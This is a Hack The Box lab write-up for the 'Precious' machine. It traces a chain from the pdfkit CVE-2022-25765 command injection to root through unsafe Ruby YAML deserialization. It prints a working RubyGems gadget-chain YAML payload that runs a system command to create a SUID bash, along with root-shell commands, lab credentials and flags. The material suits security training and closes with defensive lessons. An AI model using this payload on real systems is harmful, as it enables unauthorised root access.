## Overview

This write‑up documents the full compromise of the **Precious** machine on Hack The Box, from initial enumeration to root privilege escalation. The attack chain involves identifying a vulnerable PDF generation service, exploiting a known command injection vulnerability, and abusing unsafe Ruby deserialization to escalate privileges.

---

## Flags

- **User:** `7f1ee47c9bed60697dc401c0249e2848`
- **Root:** `d5e8d2c3f51a5c88fc1f760e2b432aa4`

---

## Enumeration

### 1. Target Information

- **Operating System:** Linux
- **Identified User:**
  - `henry:Q3c1AqGHtoI0aXAYFH`

---

### 2. Network Services

| Port | Service | Version |
|----|----|----|
| 22/tcp | SSH | OpenSSH 8.4p1 (Debian 11) |
| 80/tcp | HTTP | nginx 1.18.0 |

---

### 3. HTTP Service (Port 80)

The web application hosted on port 80 provides a service that converts HTML input into PDF documents.

Steps taken:

1. Added the virtual host to `/etc/hosts`:
   ```text
   precious.htb
   ```

2. Generated a PDF via the web interface and downloaded it.

3. Inspected the PDF metadata using `exiftool`:
   ```bash
   exiftool file.pdf
   ```

4. The metadata revealed the PDF was generated using **pdfkit v0.8.6**.

---

## Vulnerability Discovery

Researching `pdfkit v0.8.6` revealed **CVE‑2022‑25765**, a critical command injection vulnerability that allows arbitrary command execution when user‑controlled input is passed to the PDF generation backend.

- **CVE:** CVE‑2022‑25765  
- **Impact:** Remote Command Execution  
- **Exploit Reference:** https://www.exploit-db.com/exploits/51293

The exploit was confirmed to be applicable and functional against the target.

---

## Exploitation

### 1. Initial Foothold

- Executed the public exploit for CVE‑2022‑25765
- Achieved remote code execution
- Obtained a shell running as the **ruby** user

---

### 2. User Compromise (Henry)

While enumerating the system:

- Accessed Henry’s home directory
- Discovered credentials for user `henry`

```text
henry : Q3c1AqGHtoI0aXAYFH
```

Using these credentials, SSH access was established as `henry`.

- User flag obtained:
```text
7f1ee47c9bed60697dc401c0249e2848
```

---

## Privilege Escalation

### 1. Sudo Permissions

Running `sudo -l` revealed the following:

```text
(ALL) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

This allows user `henry` to execute the Ruby script **as root**.

---

### 2. Vulnerable Script Analysis

The script `/opt/update_dependencies.rb` contains the following unsafe code:

```ruby
YAML.load(File.read("dependencies.yml"))
```

Key issues:

- `YAML.load` performs **unsafe deserialization**
- The file path is **relative to the current working directory**
- No validation or class restrictions are applied

This enables **arbitrary object instantiation** and command execution when attacker‑controlled YAML is loaded.

---

### 3. Exploitation via YAML Deserialization

A malicious `dependencies.yml` file was crafted in `/home/henry` and the script was executed from that directory.

#### Malicious `dependencies.yml`

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cp /bin/bash /home/henry/bash && chmod u+s /home/henry/bash
         method_id: :resolve
```

This payload abuses RubyGems gadget chains to invoke `Kernel.system`, copying `/bin/bash` and setting the SUID bit.

---

### 4. Root Access

After executing:

```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

A SUID‑enabled bash binary was created:

```bash
/home/henry/bash -p
```

This resulted in a **root shell**.

- Root flag obtained:
```text
d5e8d2c3f51a5c88fc1f760e2b432aa4
```

✔ Full system compromise complete.

---

## Conclusion

The Precious machine demonstrates the dangers of:

- Exposing vulnerable third‑party libraries
- Unsafe deserialization with `YAML.load`
- Executing scripts with elevated privileges using relative file paths

This chain allowed a complete compromise from unauthenticated web access to full root control.

---

## Lessons Learned

- Always use `YAML.safe_load` with strict class whitelisting
- Avoid relative paths in privileged scripts
- Keep dependencies updated and audited
- Treat PDF/HTML rendering pipelines as high‑risk attack surfaces
